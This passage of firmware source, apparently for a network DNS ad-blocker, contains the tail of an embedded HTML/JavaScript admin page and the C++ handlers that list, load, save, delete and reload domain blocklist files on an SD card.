                <div class="stat-label">Forwarded Requests</div>
                <div class="stat-value forwarded" id="forwardedCount">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">DNS Server</div>
                <div class="stat-value" id="dnsStatus">--</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Bloom Filter</div>
                <div class="stat-value" id="bloomStatus">--</div>
            </div>
        </div>

        <div class="content-container">
            <div class="sidebar">
                <h3>Blocklist Files</h3>
                <div class="file-list" id="fileList"></div>
                <div style="margin-top:15px">
                    <input type="text" id="newFileName" placeholder="new_blocklist.txt" style="width:100%;padding:10px;margin-bottom:8px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text)">
                    <button onclick="createFile()" style="width:100%;padding:10px;border-radius:8px;border:none;background:var(--success);color:#fff;cursor:pointer;font-weight:600">+ Create New</button>
                </div>
            </div>

            <div class="main-content">
                <div class="toolbar">
                    <input type="text" id="currentFile" placeholder="Select a blocklist file..." readonly>
                    <button class="success" onclick="saveFile()">Save</button>
                    <button class="danger" onclick="deleteFile()">Delete</button>
                    <button onclick="reloadBloom()">Reload Bloom Filter</button>
                </div>
                <textarea id="editor" placeholder="# Blocklist format (hosts file style):
# Lines starting with # are comments
# Format: 0.0.0.0 domain.com
# or just: domain.com

0.0.0.0 ads.example.com
0.0.0.0 tracking.example.com
analytics.badsite.com"></textarea>
                <div class="help-text">
                    <strong>Format:</strong> Use hosts file format (0.0.0.0 domain.com) or plain domain names. Lines starting with # are ignored.
                    After editing, click "Reload Bloom Filter" to apply changes.
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentFileName = '';

        function showToast(msg, type) {
            const t = document.createElement('div');
            t.className = 'toast ' + type;
            t.textContent = msg;
            document.body.appendChild(t);
            setTimeout(() => t.remove(), 3000);
        }

        function loadStats() {
            fetch('/api/dns/stats')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('blockedCount').textContent = data.blockedCount;
                    document.getElementById('forwardedCount').textContent = data.forwardedCount;
                    document.getElementById('dnsStatus').textContent = data.dnsServerRunning ? 'Running' : 'Stopped';
                    document.getElementById('dnsStatus').style.color = data.dnsServerRunning ? 'var(--success)' : 'var(--danger)';
                    document.getElementById('bloomStatus').textContent = data.bloomFilterLoaded ? 'Loaded' : 'Empty';
                    document.getElementById('bloomStatus').style.color = data.bloomFilterLoaded ? 'var(--success)' : 'var(--dim)';
                });
        }

        function loadFileList() {
            fetch('/api/blocklist/list')
                .then(r => r.json())
                .then(files => {
                    const list = document.getElementById('fileList');
                    list.innerHTML = '';
                    files.forEach(file => {
                        const div = document.createElement('div');
                        div.className = 'file-item' + (file === currentFileName ? ' selected' : '');
                        div.textContent = file;
                        div.onclick = () => loadFile(file);
                        list.appendChild(div);
                    });
                });
        }

        function loadFile(filename) {
            fetch('/api/blocklist/load?file=' + encodeURIComponent(filename))
                .then(r => r.ok ? r.text() : Promise.reject('File not found'))
                .then(content => {
                    currentFileName = filename;
                    document.getElementById('currentFile').value = filename;
                    document.getElementById('editor').value = content;
                    loadFileList();
                })
                .catch(e => showToast('Error: ' + e, 'error'));
        }

        function saveFile() {
            if (!currentFileName) {
                showToast('No file selected', 'error');
                return;
            }
            fetch('/api/blocklist/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: currentFileName, content: document.getElementById('editor').value})
            })
            .then(r => r.ok ? showToast('Saved!', 'success') : showToast('Save failed', 'error'))
            .catch(e => showToast('Error: ' + e, 'error'));
        }

        function createFile() {
            let filename = document.getElementById('newFileName').value.trim();
            if (!filename) {
                showToast('Enter a filename', 'error');
                return;
            }
            if (!filename.endsWith('.txt')) filename += '.txt';

            fetch('/api/blocklist/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: filename, content: '# Blocklist\n# Add domains to block below\n'})
            })
            .then(r => {
                if (r.ok) {
                    showToast('File created!', 'success');
                    document.getElementById('newFileName').value = '';
                    loadFileList();
                    loadFile(filename);
                } else {
                    showToast('Create failed', 'error');
                }
            });
        }

        function deleteFile() {
            if (!currentFileName) {
                showToast('No file selected', 'error');
                return;
            }
            if (!confirm('Delete "' + currentFileName + '"?')) return;

            fetch('/api/blocklist/delete', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({filename: currentFileName})
            })
            .then(r => {
                if (r.ok) {
                    showToast('Deleted', 'success');
                    currentFileName = '';
                    document.getElementById('currentFile').value = '';
                    document.getElementById('editor').value = '';
                    loadFileList();
                } else {
                    showToast('Delete failed', 'error');
                }
            });
        }

        function reloadBloom() {
            fetch('/api/blocklist/reload', {method: 'POST'})
                .then(r => r.ok ? showToast('Bloom filter reloaded!', 'success') : showToast('Reload failed', 'error'))
                .then(() => loadStats());
        }

        setInterval(loadStats, 5000);
        window.onload = () => { loadFileList(); loadStats(); };
    </script>
</body>
</html>
)WEBUI";
    server.send(200, "text/html", html);
}

void handleApiBlocklistList() {
    if (!checkAuth()) return;
    logRequest(server);

    File dir = SD.open("/blocklists");
    if (!dir) {
        server.send(200, "application/json", "[]");
        return;
    }

    String json = "[";
    bool first = true;
    File entry = dir.openNextFile();
    while (entry) {
        if (!entry.isDirectory()) {
            String name = String(entry.name());
            name = name.substring(name.lastIndexOf('/') + 1);
            if (!first) json += ",";
            json += "\"" + name + "\"";
            first = false;
        }
        entry.close();
        entry = dir.openNextFile();
    }
    json += "]";
    dir.close();

    server.send(200, "application/json", json);
}

void handleApiBlocklistLoad() {
    if (!checkAuth()) return;
    logRequest(server);

    if (!server.hasArg("file")) {
        server.send(400, "text/plain", "Missing file parameter");
        return;
    }

    String filename = server.arg("file");
    if (filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(403, "text/plain", "Invalid filename");
        return;
    }

    String path = "/blocklists/" + filename;
    File file = SD.open(path);
    if (!file) {
        server.send(404, "text/plain", "File not found");
        return;
    }

    server.streamFile(file, "text/plain");
    file.close();
}

void handleApiBlocklistSave() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    if (deserializeJson(doc, server.arg("plain"))) {
        server.send(400, "text/plain", "Invalid JSON");
        return;
    }

    String filename = doc["filename"] | "";
    String content = doc["content"] | "";

    if (filename.length() == 0 || filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(400, "text/plain", "Invalid filename");
        return;
    }

    String path = "/blocklists/" + filename;
    File file = SD.open(path, FILE_WRITE);
    if (!file) {
        server.send(500, "text/plain", "Cannot create file");
        return;
    }

    file.print(content);
    file.close();
    server.send(200, "text/plain", "Saved");
}

void handleApiBlocklistDelete() {
    if (!checkAuth()) return;
    logRequest(server);

    JsonDocument doc;
    if (deserializeJson(doc, server.arg("plain"))) {
        server.send(400, "text/plain", "Invalid JSON");
        return;
    }

    String filename = doc["filename"] | "";
    if (filename.length() == 0 || filename.indexOf("..") != -1 || filename.indexOf("/") != -1) {
        server.send(400, "text/plain", "Invalid filename");
        return;
    }

    String path = "/blocklists/" + filename;
    if (SD.remove(path)) {
        server.send(200, "text/plain", "Deleted");
    } else {
        server.send(500, "text/plain", "Delete failed");
    }
}

void handleApiBlocklistReload() {
    if (!checkAuth()) return;
    logRequest(server);

    initBloomFilter();
    server.send(200, "text/plain", "Bloom filter reloaded");
}
